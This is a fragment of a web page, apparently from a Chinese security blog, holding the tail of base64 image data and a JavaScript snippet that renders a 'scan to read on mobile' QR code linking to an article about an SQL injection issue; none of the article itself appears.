br8eRIegujmILtdfobnC6xOyekov0reFQLYKwdV5aotV+jDmIRyC5s4QkofgKl/3roLk4BPtgWiVq1IXS9uXurj36lodxrnl7Qvir/Iw+vaaL9wWUuSq1z+B7busvi05ZKudw6j7SzEnF9UhfTBiz8lF+1dc/SsIOYM9EA4j6nsGGH0INyeaX3FIH3zi9Qnxab0Jbt9lQbbUt+o5Ye5DdAia7whzv98PklOHcAj2ueYKIZm6roJwCNoLI6/svsypQfIQ7H7nZ32rfPVdnxCfzpvg9jXE80DeAgjW1vYFc90MxHeeqL/i6h17H2Q+BPf5ntV7VofjTGfs0Xkwz0N0c/ZCdAjO9OsT4lN5E9y+hvTzuF3INiG40mH0zfW5ckgeguorXM2D9MMRe0/nkB7v2X31FZoXIfNW3Dn6nZd+fUJ8Km+Ch68htaUqz1fXVXLIWyAXK1MF8WGO5ldYM6r0IXPkYmWq5M8gjLOqv8peiF9aFYy8tCqIDiM+O6fn4HPO9Qnx6bwJHhYCn9sCtmPWm7EvDTVg+Pdq/Y7mz3R4PA/iO2+GkAwE+z3lMPedaU5UP0PIXHMQ7hxRv/CwEEMXvuYJnH6X1Y8F2XJts0q/rmfVfRj77YHoEFQXndMRkocjmj2boS/aB8eZgPb9dwRgiQYhmT5ff4/XJ2T/NN7gevsuy+2Jq7N1H7J9CK76IP6qX110DqQPgurmZtgzMPbqixAfguodvZf6iquL5jvO/OsT0p/Si/n2NQTydsBz6Lndsgjp774cRr/rMPedb16E5AGlDYH77+8KzhBh7pvvCGO++3KY52DUIRw+8fqE+BTfBLeF+Nac4erckC3rQzgEnav/t9C5hauZ5VXpQ84k7wjxq2df5iA+BNVFe+Ri1+V73BZi04WvfQKHhUC2DiOujgnJdX+/9bruPsz7eq56q2DMQzgcsc/ovOZVqdd1FWSWughzXV+E5GBEfRHW/mEhNl34mifw1xZSb1jV6pcBeStWvnrNqIKv5avHcpYImQUj6nd0DiQvN/cs7zn71UXIfYDr//1+e7Mff+0TAtmyvz4YuW+Dvrxj98845D6A0Yf//Um/X/Gt8eMCGP788iFvcyF+9VbByM3DqEN49+WFf20hNeyqP38Ch4XUxme1upVZ/c5hfCvMQXSYo7mOzof0yQshGjyHzobka8aseu6MQ+aZW6H32vuHhezN6/r7n8C2EMhW4TGujjjbdmW7/iyH+TlqZlWfs9f0xPJmBbmHOQiHOfYZ9qnLRfWOMM7f+9tC9uJ1/boncC3kdc9+euf/AAAA//83NVGaAAAABklEQVQDAGponctsZAn+AAAAAElFTkSuQmCC)

手机扫码阅读


var qrcode = new QRCode(document.getElementById("posts-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/hanvon-efacego-searchVisitReason-sqli.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});
 